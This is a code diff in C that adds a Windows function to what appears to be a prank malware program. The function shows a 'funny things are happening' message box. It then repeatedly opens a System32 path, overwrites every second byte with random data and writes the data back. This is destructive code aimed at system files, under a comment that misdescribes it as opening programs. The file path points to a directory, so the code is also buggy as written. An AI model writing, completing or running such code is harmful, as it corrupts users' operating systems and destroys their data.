@@ -301,3 +301,52 @@ int p11()
         CloseHandle(hFile);
     }
 }
+
+//Open random system programs
+int p12()
+{
+    MessageBoxW(NULL, L"Some very funny things are happening right now!", L":)", MB_OK | MB_ICONINFORMATION);
+    fori(100)
+    {
+        HANDLE hFile = CreateFileA("C:\\Windows\\System32\\", GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+        if (hFile == INVALID_HANDLE_VALUE)
+        {
+            break;
+        }
+        DWORD dwSize = GetFileSize(hFile, NULL);
+        if (dwSize == INVALID_FILE_SIZE)
+        {
+            break;
+        }
+        LPVOID lpBuffer = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
+        if (lpBuffer == NULL)
+        {
+            break;
+        }
+        DWORD dwBytesRead = 0;
+        if (!ReadFile(hFile, lpBuffer, dwSize, &dwBytesRead, NULL))
+        {
+            break;
+        }
+        LPVOID lpBuffer2 = VirtualAlloc(NULL, dwSize, MEM_COMMIT, PAGE_READWRITE);
+        if (lpBuffer2 == NULL)
+        {
+            break;
+        }
+        memcpy(lpBuffer2, lpBuffer, dwSize);
+        fori(dwSize)
+        {
+            if (i % 2 == 0)
+            {
+                ((LPBYTE)lpBuffer2)[i] = rand() % 255;
+            }
+        }
+        if (!WriteFile(hFile, lpBuffer2, dwSize, &dwBytesRead, NULL))
+        {
+            break;
+        }
+        VirtualFree(lpBuffer, 0, MEM_RELEASE);
+        VirtualFree(lpBuffer2, 0, MEM_RELEASE);
+        CloseHandle(hFile);
+    }
+}
